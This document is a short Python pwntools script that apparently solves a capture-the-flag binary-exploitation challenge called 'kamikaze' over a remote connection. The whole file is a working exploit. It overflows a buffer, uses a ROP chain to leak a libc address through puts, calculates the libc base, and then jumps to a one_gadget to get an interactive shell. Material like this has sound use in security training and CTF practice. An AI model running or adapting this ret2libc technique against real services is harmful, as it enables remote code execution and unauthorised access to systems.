from pwn import *

def exploit():
    # p = process("./kamikaze")
    p = remote("13.48.67.196", 50000)
    padding = 10
    binary = ELF("./kamikaze")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    main = binary.symbols['main']
    puts_plt = binary.plt['puts']
    gets_got = binary.got['gets']
    pop_rdi = 0x00000000004009b3 # pop rdi ; ret

    payload = ''
    payload += 'A' * padding
    payload += p64(pop_rdi)
    payload += p64(gets_got)
    payload += p64(puts_plt)
    payload += p64(main)

    # gdb.attach(p,'''
    #             brva *main+162
                
    #             ''')

    p.sendline(payload)
    
    p.recvuntil("Thanks for voting!\n")
    libc_leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x0800b0
    log.info("Libc base : {}".format(hex(libc_base)))
    one_gadget = libc_base + 0x10a38c
    log.info("One gadget addr : {}".format(hex(one_gadget)))

    payload = ''
    payload += 'A' * padding
    payload += p64(one_gadget)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()